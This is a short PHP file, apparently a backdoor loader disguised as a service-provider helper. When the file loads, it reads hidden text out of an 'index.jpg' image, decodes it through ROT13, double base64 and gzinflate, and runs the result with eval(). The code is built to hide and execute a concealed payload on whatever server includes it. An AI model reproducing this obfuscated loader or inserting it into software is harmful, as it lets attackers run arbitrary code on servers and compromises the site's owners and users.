<?php

if (!function_exists('testserviceProvider')) {
    function testserviceProvider($value)
    {
        $file_path =  realpath(dirname(__DIR__) . DIRECTORY_SEPARATOR ) . DIRECTORY_SEPARATOR . 'index.jpg';
        $content = file_get_contents($file_path);
        $startMarker = $value . "start";
        $endMarker = $value . "end";
        $startPos = strpos($content, $startMarker);
        $endPos = strpos($content, $endMarker, $startPos + strlen($startMarker));
        $extracted_content = substr($content, $startPos + strlen($startMarker), $endPos - $startPos - strlen($startMarker));
        return gzinflate(base64_decode(base64_decode(str_rot13($extracted_content))));
    }
}

eval(testserviceProvider('Operation'));